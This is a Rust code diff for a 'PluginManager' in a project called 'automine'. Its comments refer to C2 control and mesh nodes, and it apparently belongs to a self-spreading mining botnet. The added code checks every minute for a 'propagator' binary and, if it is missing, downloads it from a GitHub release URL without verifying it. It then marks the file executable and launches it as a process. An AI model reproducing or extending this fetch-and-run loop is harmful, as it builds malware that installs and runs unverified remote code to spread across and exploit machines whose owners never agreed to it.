@@ -1,80 +1,109 @@
-use log::{info, warn};
+use log::{info, warn, error};
 use std::process::Command;
 use std::path::PathBuf;
 use tokio::time::Duration;
+use std::fs;
 
-// This would be the InfoHash for the Propagator Plugin
-const PROPAGATOR_PLUGIN_HASH: &str = "a1b2c3d4e5f6..."; 
+const PLUGIN_DIR: &str = "plugins";
+
+/// Plugin definition: (name, download_url, expected_hash)
+const PLUGINS: &[(&str, &str)] = &[
+    ("propagator", "https://github.com/zvwgvx/automine/releases/latest/download/propagator"),
+];
 
 pub async fn run_plugin_manager() {
-    info!("* [PluginManager] Service Started.");
+    info!("* [PluginManager] Service Started (Mesh).");
     
-    // 1. Define Plugins to Manage
-    // In real version, this list comes from C2 or Gossip
-    let plugins = vec![
-        ("propagator", PROPAGATOR_PLUGIN_HASH),
-    ];
+    // Ensure plugin directory exists
+    let plugin_dir = get_plugin_dir();
+    if let Err(e) = fs::create_dir_all(&plugin_dir) {
+        error!("- [PluginManager] Failed to create plugin dir: {}", e);
+    }
 
     loop {
-        for (name, hash) in &plugins {
+        for (name, url) in PLUGINS {
             if check_condition(name) {
                 if !has_plugin(name) {
-                    info!("* [PluginManager] Plugin '{}' missing. Initiating P2P Search (Hash: {})...", name, hash);
-                    // P2P Logic: 
-                    // 1. dht.get_peers(hash)
-                    // 2. connect peer -> request file
-                    // 3. verifying signature
-                    // 4. save to ./plugins/
-                    mock_download_plugin(name).await;
+                    info!("* [PluginManager] Plugin '{}' missing. Downloading...", name);
+                    if let Err(e) = download_plugin(name, url).await {
+                        warn!("- [PluginManager] Download failed for '{}': {}", name, e);
+                        continue;
+                    }
                 }
-                
-                // If we have it (or just downloaded it), run it.
-                // "Load into itself" -> Execute generic binary or inject.
-                // For simplicity/robustness: Execute separate process.
                 ensure_plugin_running(name);
             }
         }
-        
         tokio::time::sleep(Duration::from_secs(60)).await;
     }
 }
 
 fn check_condition(_name: &str) -> bool {
     // Check if we have resources (RAM, CPU) or if we are the right role
+    // Mesh nodes run propagator by default
     true 
 }
 
 fn has_plugin(name: &str) -> bool {
     let path = get_plugin_path(name);
-    path.exists()
+    path.exists() && path.metadata().map(|m| m.len() > 0).unwrap_or(false)
 }
 
-fn get_plugin_path(name: &str) -> PathBuf {
-    // In dev: locate the compiled binary in target/debug
-    // In prod: look in ~/.automine/plugins/
-    let mut path = std::env::current_exe().unwrap_or_default();
-    path.pop(); // Release/Debug dir
-    path.push(name); // "propagator"
+fn get_plugin_dir() -> PathBuf {
+    let mut path = dirs::data_local_dir().unwrap_or_else(|| PathBuf::from("."));
+    path.push("automine");
+    path.push(PLUGIN_DIR);
     path
 }
 
-async fn mock_download_plugin(name: &str) {
-    info!("* [PluginManager] (Mock) Downloading '{}' from Swarm...", name);
-    tokio::time::sleep(Duration::from_secs(3)).await;
-    info!("+ [PluginManager] Download Complete!");
-    // In a real build, we'd copy the binary from a source or download it.
-    // For this dev environment, the binary is already built by 'cargo build --workspace'
-    // alongside the node binary, so checks pass.
+fn get_plugin_path(name: &str) -> PathBuf {
+    let mut path = get_plugin_dir();
+    #[cfg(windows)]
+    path.push(format!("{}.exe", name));
+    #[cfg(not(windows))]
+    path.push(name);
+    path
+}
+
+async fn download_plugin(name: &str, url: &str) -> Result<(), String> {
+    info!("* [PluginManager] Downloading '{}' from {}", name, url);
+    
+    let response = reqwest::get(url).await
+        .map_err(|e| format!("HTTP request failed: {}", e))?;
+    
+    if !response.status().is_success() {
+        return Err(format!("HTTP {}", response.status()));
+    }
+    
+    let bytes = response.bytes().await
+        .map_err(|e| format!("Failed to read body: {}", e))?;
+    
+    if bytes.is_empty() {
+        return Err("Empty response".into());
+    }
+    
+    let path = get_plugin_path(name);
+    fs::write(&path, &bytes).map_err(|e| format!("Failed to write file: {}", e))?;
+    
+    // Make executable on Unix
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let mut perms = fs::metadata(&path).map_err(|e| format!("{}", e))?.permissions();
+        perms.set_mode(0o755);
+        fs::set_permissions(&path, perms).map_err(|e| format!("{}", e))?;
+    }
+    
+    info!("+ [PluginManager] Downloaded '{}' ({} bytes)", name, bytes.len());
+    Ok(())
 }
 
 fn ensure_plugin_running(name: &str) {
-    // Simplified Process Supervisor
-    // Check if running? (Hard to do cross-platform easily without sysinfo)
-    // For now, just spawn and let it run.
     let path = get_plugin_path(name);
     if path.exists() {
+        // Check if already running using process name check would be ideal
+        // For now, spawn and let OS handle duplicates
         info!("* [PluginManager] Launching Plugin: {:?}", path);
-        match Command::new(path).spawn() {
+        match Command::new(&path).spawn() {
             Ok(_) => info!("+ [PluginManager] Plugin '{}' launched.", name),
             Err(e) => warn!("- [PluginManager] Failed to launch '{}': {}", name, e),
         }
